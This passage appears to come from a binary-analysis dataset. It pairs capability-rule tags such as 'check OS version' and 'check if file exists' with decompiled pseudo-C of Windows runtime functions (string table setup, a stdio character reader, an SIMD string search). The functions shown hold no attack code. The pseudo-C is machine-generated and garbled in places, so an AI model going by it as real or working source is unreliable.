7);\n        uVar7 = 0;\n        piVar10 = piVar1 + 7;\n        do {\n            if (iVar12 == 1) {\n                *(piVar10 + iVar11) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 7);\n        uVar7 = 0;\n        piVar10 = piVar1 + 0xe;\n        do {\n            if (iVar12 == 1) {\n                *(piVar10 + iVar11) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 0xc);\n        uVar7 = 0;\n        piVar10 = piVar1 + 0x1a;\n        do {\n            if (iVar12 == 1) {\n                *(piVar10 + iVar11) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 0xc);\n        uVar7 = 0;\n        piVar10 = piVar1 + 0x26;\n        do {\n            if (iVar12 == 1) {\n                *(piVar10 + iVar11) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 2);\n        if (iVar12 == 1) {\n            *(arg1 + 0x140) = arg1 + uVar8;\n            iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, piVar1[0x28]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        uVar7 = 0;\n        iVar4 = -1;\n        do {\n            iVar4 = iVar4 + 1;\n        } while (*(piVar1[0x28] + iVar4) != '\\0');\n        iVar4 = uVar8 + 1 + iVar4;\n        if (iVar12 == 1) {\n            *(arg1 + 0x148) = arg1 + iVar4;\n            iVar3 = fcn.1800c1fe8(arg1 + iVar4, uVar6 - iVar4, piVar1[0x29]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar5 = -1;\n        do {\n            iVar5 = iVar5 + 1;\n        } while (*(piVar1[0x29] + iVar5) != '\\0');\n        iVar5 = iVar4 + 1 + iVar5;\n        if (iVar12 == 1) {\n            *(arg1 + 0x150) = arg1 + iVar5;\n            iVar3 = fcn.1800c1fe8(arg1 + iVar5, uVar6 - iVar5, piVar1[0x2a]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar4 = -1;\n        do {\n            iVar4 = iVar4 + 1;\n        } while (*(piVar1[0x2a] + iVar4) != '\\0');\n        uVar8 = iVar5 + 1 + iVar4;\n        if (iVar12 == 1) {\n            *(arg1 + 0x158) = *(piVar1 + 0x2b);\n            *(arg1 + 0x15c) = 0;\n        }\n        piVar10 = piVar1 + 0x2c;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            uVar9 = 0;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 7);\n        piVar10 = piVar1 + 0x33;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            uVar7 = 0;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar9 = uVar9 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar9 < 7);\n        piVar10 = piVar1 + 0x3a;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            uVar9 = 0;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 0xc);\n        piVar10 = piVar1 + 0x46;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            uVar7 = 0;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar9 = uVar9 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar9 < 0xc);\n        piVar10 = piVar1 + 0x52;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 2);\n        for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n        }\n        if (iVar12 == 1) {\n            iVar11 = arg1 + (uVar8 & 0xfffffffffffffffe);\n            *(arg1 + 0x2a0) = iVar11;\n            iVar3 = fcn.1800c07fc(iVar11, uVar6 - uVar8 >> 1, piVar1[0x54]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(piVar1[0x54] + iVar11 * 2) != 0);\n        for (uVar8 = uVar8 + iVar11 * 2 + 2; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n        }\n        if (iVar12 == 1) {\n            iVar11 = arg1 + (uVar8 & 0xfffffffffffffffe);\n            *(arg1 + 0x2a8) = iVar11;\n            iVar3 = fcn.1800c07fc(iVar11, uVar6 - uVar8 >> 1, piVar1[0x55]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(piVar1[0x55] + iVar11 * 2) != 0);\n        for (uVar8 = uVar8 + iVar11 * 2 + 2; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n        }\n        if (iVar12 == 1) {\n            iVar11 = arg1 + (uVar8 & 0xfffffffffffffffe);\n            *(arg1 + 0x2b0) = iVar11;\n            iVar3 = fcn.1800c07fc(iVar11, uVar6 - uVar8 >> 1, piVar1[0x56]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(piVar1[0x56] + iVar11 * 2) != 0);\n        for (uVar7 = uVar8 + iVar11 * 2 + 2; (uVar7 & 1) != 0; uVar7 = uVar7 + 1) {\n        }\n        if (iVar12 == 1) {\n            iVar11 = arg1 + (uVar7 & 0xfffffffffffffffe);\n            *(arg1 + 0x2b8) = iVar11;\n            iVar3 = fcn.1800c07fc(iVar11, uVar6 - uVar7 >> 1, piVar1[0x57]);\n            if (iVar3 != 0) {\ncode_r0x0001800c049b:\n                fcn.1800b3558(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                uVar6 = (*pcVar2)();\n                return uVar6;\n            }\n        }\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(piVar1[0x57] + iVar11 * 2) != 0);\n        uVar8 = iVar12 + 1U;\n        uVar7 = uVar7 + iVar11 * 2 + 2;\n        uVar9 = arg1;\n    } while (iVar12 + 1U < 2);\n    if (cStack48 != '\\0') {\n        *(iStack72 + 0x3a8) = *(iStack72 + 0x3a8) & 0xfffffffd;\n    }\n    return uVar9;\n}\n",
        "token_count": 3865
    },
    "1800b32e": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.1800b32e4(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    \n    if ((arg1 == 0) || (2 < arg3)) {\n        puVar2 = fcn.1800ba53c(arg1);\n        *puVar2 = 0x16;\n        fcn.1800b3508();\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.1800b22b0(arg1);\n        uVar1 = fcn.1800b322c(arg1, arg2, arg3);\n        fcn.1800b22bc(arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "1800c5f0": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort fcn.1800c5f04(int64_t *arg1)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int64_t iVar7;\n    uchar uVar8;\n    \n    if (arg1 == NULL) {\n        puVar6 = fcn.1800ba53c(0);\n        *puVar6 = 0x16;\n        fcn.1800b3508();\n    }\n    else if (((*(arg1 + 0x14) >> 0xd & 1) != 0) && ((*(arg1 + 0x14) >> 0xc & 1) == 0)) {\n        if ((*(arg1 + 0x14) >> 1 & 1) == 0) {\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | 1;\n            if ((*(arg1 + 0x14) & 0x4c0) == 0) {\n                fcn.1800c3a3c(arg1);\n            }\n            iVar3 = *(arg1 + 2);\n            if (iVar3 == 1) {\n                uVar8 = **arg1;\n            }\n            else {\n                uVar8 = 0;\n            }\n            iVar7 = arg1[1];\n            *arg1 = iVar7;\n            uVar4 = fcn.1800c20cc(arg1);\n            iVar5 = fcn.1800c87fc(uVar4, iVar7, *(arg1 + 4));\n            *(arg1 + 2) = iVar5;\n            if (2 < iVar5 + 1U) {\n                if ((*(arg1 + 0x14) & 6) == 0) {\n                    iVar5 = fcn.1800c20cc(arg1);\n                    if ((iVar5 == -1) || (iVar5 = fcn.1800c20cc(arg1),  iVar5 == -2)) {\n                        iVar7 = 0x1801233c0;\n                    }\n                    else {\n                        iVar5 = fcn.1800c20cc(arg1);\n                        uVar4 = fcn.1800c20cc(arg1);\n                        iVar7 = *((iVar5 >> 6) * 8 + 0x180129850) + (uVar4 & 0x3f) * 0x48;\n                    }\n                    if ((*(iVar7 + 0x38) & 0x82) == 0x82) {\n                        LOCK();\n                        *(arg1 + 0x14) = *(arg1 + 0x14) | 0x20;\n                    }\n                }\n                if (((*(arg1 + 4) == 0x200) && ((*(arg1 + 0x14) >> 6 & 1) != 0)) && ((*(arg1 + 0x14) >> 8 & 1) == 0)) {\n                    *(arg1 + 4) = 0x1000;\n                }\n                if (iVar3 == 1) {\n                    uVar1 = **arg1;\n                    *(arg1 + 2) = *(arg1 + 2) + -1;\n                    *arg1 = *arg1 + 1;\n                    return CONCAT11(uVar1, uVar8);\n                }\n                uVar2 = **arg1;\n                *(arg1 + 2) = *(arg1 + 2) + -2;\n                *arg1 = *arg1 + 2;\n                return uVar2;\n            }\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | (-(iVar5 != 0) & 8) + 8;\n            *(arg1 + 2) = 0;\n        }\n        else {\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | 0x10;\n        }\n    }\n    return 0xffff;\n}\n",
        "token_count": 899
    },
    "1800d6c2": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** fcn.1800d6c2c(code **arg1)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    \n    if (-1 < *0x18012878c) {\n        if (*0x18012878c < 2) {\n            if (*0x180128888 != 0) {\n                pcVar2 = vtable.Concurrency::details::stl_condition_variable_win7.0;\n                goto code_r0x0001800d6c64;\n            }\n        }\n        else if (*0x18012878c != 2) goto code_r0x0001800d6c40;\n        if (*0x180128858 != 0) {\n            pcVar2 = vtable.Concurrency::details::stl_condition_variable_vista.0;\ncode_r0x0001800d6c64:\n            *arg1 = pcVar2;\n    // WARNING: Could not recover jumptable at 0x0001800754c3. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppcVar1 = (**0x1800de8f0)(arg1 + 1);\n            return ppcVar1;\n        }\n    }\ncode_r0x0001800d6c40:\n    *arg1 = vtable.Concurrency::details::stl_condition_variable_concrt.0;\n    arg1[1] = NULL;\n    fcn.180090e38(arg1 + 2);\n    return arg1 + 1;\n}\n",
        "token_count": 332
    },
    "1800d6d8": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.1800d6d8c(uchar (*arg1) [16], ulong arg2)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uchar (*pauVar7) [16];\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    char cVar12;\n    char cVar13;\n    char cVar14;\n    uchar auVar11 [16];\n    uchar in_XMM1 [16];\n    uchar auVar15 [16];\n    uint8_t uVar16;\n    \n    pauVar7 = NULL;\n    if (arg2 == 0) {\n        pcVar5 = arg1 & 0xfffffffffffffff0;\n        auVar11 = in_XMM1 & 0x0;\n        cVar10 = SUB161(auVar11 >> 0x40, 0);\n        cVar12 = SUB161(auVar11 >> 0x48, 0);\n        cVar13 = SUB161(auVar11 >> 0x50, 0);\n        cVar14 = SUB161(auVar11 >> 0x58, 0);\n        auVar11 = CONCAT115(-(pcVar5[0xf] == '\\0'), \n                            CONCAT114(-(pcVar5[0xe] == '\\0'), \n                                      CONCAT113(-(pcVar5[0xd] == '\\0'), \n                                                CONCAT112(-(pcVar5[0xc] == '\\0'), \n                                                          CONCAT111(-(pcVar5[0xb] == cVar14), \n                                                                    CONCAT110(-(pcVar5[10] == cVar13), \n                                                                              CONCAT19(-(pcVar5[9] == cVar12), \n                                                                                       CONCAT18(-(pcVar5[8] == cVar10), \n                                                                                                CONCAT17(-(pcVar5[7] ==\n                                                                                                          '\\0'), \n                                                            CONCAT16(-(pcVar5[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar5[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar5[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar5[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar5[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar5[1] == '\\0'), -(*pcVar5 == '\\0'))))))))))))\n                                                         ))));\n        uVar2 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar5[0xf] == '\\0') >> 7) << 0xf) & -1 << (arg1 & 0xf);\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) {\n            do {\n                pcVar5 = pcVar6 + 0x10;\n                auVar11 = CONCAT115(-(pcVar6[0x1f] == '\\0'), \n                                    CONCAT114(-(pcVar6[0x1e] == '\\0'), \n                                              CONCAT113(-(pcVar6[0x1d] == '\\0'), \n                                                        CONCAT112(-(pcVar6[0x1c] == '\\0'), \n                                                                  CONCAT111(-(pcVar6[0x1b] == cVar14), \n                                                                            CONCAT110(-(pcVar6[0x1a] == cVar13), \n                                                                                      CONCAT19(-(pcVar6[0x19] == cVar12)\n                                                                                               , CONCAT18(-(pcVar6[0x18]\n                                                                                                           == cVar10), \n                                                                                                          CONCAT17(-(\n                                                            pcVar6[0x17] == '\\0'), \n                                                            CONCAT16(-(pcVar6[0x16] == '\\0'), \n                                                                     CONCAT15(-(pcVar6[0x15] == '\\0'), \n                                                                              CONCAT14(-(pcVar6[0x14] == '\\0'), \n                                                                                       CONCAT13(-(pcVar6[0x13] == '\\0')\n                                                                                                , CONCAT12(-(pcVar6[0x12\n                                                            ] == '\\0'), \n                                                            CONCAT11(-(pcVar6[0x11] == '\\0'), -(*pcVar5 == '\\0')))))))))\n                                                            )))))));\n                uVar1 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar6[0x1f] == '\\0') >> 7) << 0xf;\n                uVar2 = uVar1;\n                pcVar6 = pcVar5;\n            } while (uVar1 == 0);\n        }\n        uVar4 = 0;\n        if (uVar2 != 0) {\n            for (; (uVar2 >> uVar4 & 1) == 0; uVar4 = uVar4 + 1) {\n            }\n        }\n        return pcVar5 + uVar4;\n    }\n    if (*0x180123090 < 2) {\n        pcVar5 = arg1 & 0xfffffffffffffff0;\n        auVar15 = pshuflw(in_XMM1, ZEXT416((arg2 & 0xff) << 8 | arg2 & 0xff), 0);\n        uVar2 = -1 << (arg1 & 0xf);\n        auVar11 = CONCAT115(-(pcVar5[0xf] == '\\0'), \n                            CONCAT114(-(pcVar5[0xe] == '\\0'), \n                                      CONCAT113(-(pcVar5[0xd] == '\\0'), \n                                                CONCAT112(-(pcVar5[0xc] == '\\0'), \n                                                          CONCAT111(-(pcVar5[0xb] == '\\0'), \n                                                                    CONCAT110(-(pcVar5[10] == '\\0'), \n                                                                              CONCAT19(-(pcVar5[9] == '\\0'), \n                                                                                       CONCAT18(-(pcVar5[8] == '\\0'), \n                                                                                                CONCAT17(-(pcVar5[7] ==\n                                                                                                          '\\0'), \n                                                            CONCAT16(-(pcVar5[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar5[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar5[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar5[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar5[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar5[1] == '\\0'), -(*pcVar5 == '\\0'))))))))))))\n                                                         ))));\n        cVar10 = SUB161(auVar15, 0);\n        cVar12 = SUB161(auVar15 >> 8, 0);\n        cVar13 = SUB161(auVar15 >> 0x10, 0);\n        cVar14 = SUB161(auVar15 >> 0x18, 0);\n        auVar15 = CONCAT115(-(cVar14 == pcVar5[0xf]), \n                            CONCAT114(-(cVar13 == pcVar5[0xe]), \n                                      CONCAT113(-(cVar12 == pcVar5[0xd]), \n                                                CONCAT112(-(cVar10 == pcVar5[0xc]), \n                                                          CONCAT111(-(cVar14 == pcVar5[0xb]), \n                                                                    CONCAT110(-(cVar13 == pcVar5[10]), \n                                                                              CONCAT19(-(cVar12 == pcVar5[9]), \n                                                                                       CONCAT18(-(cVar10 == pcVar5[8]), \n                                                                                                CONCAT17(-(cVar14 ==\n                                                                                                          pcVar5[7]), \n                                                                                                         CONCAT16(-(\n                                                            cVar13 == pcVar5[6]), \n                                                            CONCAT15(-(cVar12 == pcVar5[5]), \n                                                                     CONCAT14(-(cVar10 == pcVar5[4]), \n                                                                              CONCAT13(-(cVar14 == pcVar5[3]), \n                                                                                       CONCAT12(-(cVar13 == pcVar5[2]), \n                                                                                                CONCAT11(-(cVar12 ==\n                                                                                                          pcVar5[1]), \n                                                                                                         -(cVar10 ==\n                                                                                                          *pcVar5)))))))\n                                                            )))))))));\n        uVar4 = (SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(cVar14 == pcVar5[0xf]) >> 7) << 0xf) & uVar2;\n        uVar2 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar5[0xf] == '\\0') >> 7) << 0xf) & uVar2;\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) {\n            do {\n                uVar2 = 0x1f;\n                if (uVar4 != 0) {\n                    for (; uVar4 >> uVar2 == 0; uVar2 = uVar2 - 1) {\n                    }\n                }\n                if (uVar4 != 0) {\n                    pauVar7 = pcVar6 + uVar2;\n                }\n                pcVar5 = pcVar6 + 0x10;\n                auVar11 = ZEXT416(CONCAT13(-(pcVar6[0x13] == '\\0'), \n                                           CONCAT12(-(pcVar6[0x12] == '\\0'), \n                                                    CONCAT11(-(pcVar6[0x11] == '\\0'), -(*pcVar5 == '\\0'))))) &\n                          0xffffffffffffffff;\n                uVar16 = -(SUB161(auVar11 >> 0x78, 0) == pcVar6[0x1f]);\n                auVar15 = CONCAT115(uVar16, CONCAT114(-(SUB161(auVar11 >> 0x70, 0) == pcVar6[0x1e]), \n                                                      CONCAT113(-(SUB161(auVar11 >> 0x68, 0) == pcVar6[0x1d]), \n                                                                CONCAT112(-(SUB161(auVar11 >> 0x60, 0) == pcVar6[0x1c])\n                                                                          , CONCAT111(-(SUB161(auVar11 >> 0x58, 0) ==\n                                                                                       pcVar6[0x1b]), \n                                                                                      CONCAT110(-(SUB161(auVar11 >> 0x50\n                                                                                                         , 0) ==\n                                                                                                 pcVar6[0x1a]), \n                                                                                                CONCAT19(-(SUB161(\n                                                            auVar11 >> 0x48, 0) == pcVar6[0x19]), \n                                                            CONCAT18(-(SUB161(auVar11 >> 0x40, 0) == pcVar6[0x18]), \n                                                                     CONCAT17(-(pcVar6[0x17] == '\\0'), \n                                                                              CONCAT16(-(pcVar6[0x16] == '\\0'), \n                                                                                       CONCAT15(-(pcVar6[0x15] == '\\0')\n                                                                                                , CONCAT14(-(pcVar6[0x14\n                                                            ] == '\\0'), SUB164(auVar11, 0)))))))))))));\n                auVar11 = CONCAT115(-(cVar14 == pcVar6[0x1f]), \n                                    CONCAT114(-(cVar13 == pcVar6[0x1e]), \n                                              CONCAT113(-(cVar12 == pcVar6[0x1d]), \n                                                        CONCAT112(-(cVar10 == pcVar6[0x1c]), \n                                                                  CONCAT111(-(cVar14 == pcVar6[0x1b]), \n                                                                            CONCAT110(-(cVar13 == pcVar6[0x1a]), \n                                                                                      CONCAT19(-(cVar12 == pcVar6[0x19])\n                                                                                               , CONCAT18(-(cVar10 ==\n                                                                                                           pcVar6[0x18])\n                                                                                                          , CONCAT17(-(\n                                                            cVar14 == pcVar6[0x17]), \n                                                            CONCAT16(-(cVar13 == pcVar6[0x16]), \n                                                                     CONCAT15(-(cVar12 == pcVar6[0x15]), \n                                                                              CONCAT14(-(cVar10 == pcVar6[0x14]), \n                                                                                       CONCAT13(-(cVar14 == pcVar6[0x13]\n                                                                                                 ), CONCAT12(-(cVar13 ==\n                                                                                                              pcVar6[\n                                                            0x12]), CONCAT11(-(cVar12 == pcVar6[0x11]), \n                                                                             -(cVar10 == *pcVar5))))))))))))))));\n                uVar1 = SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar15 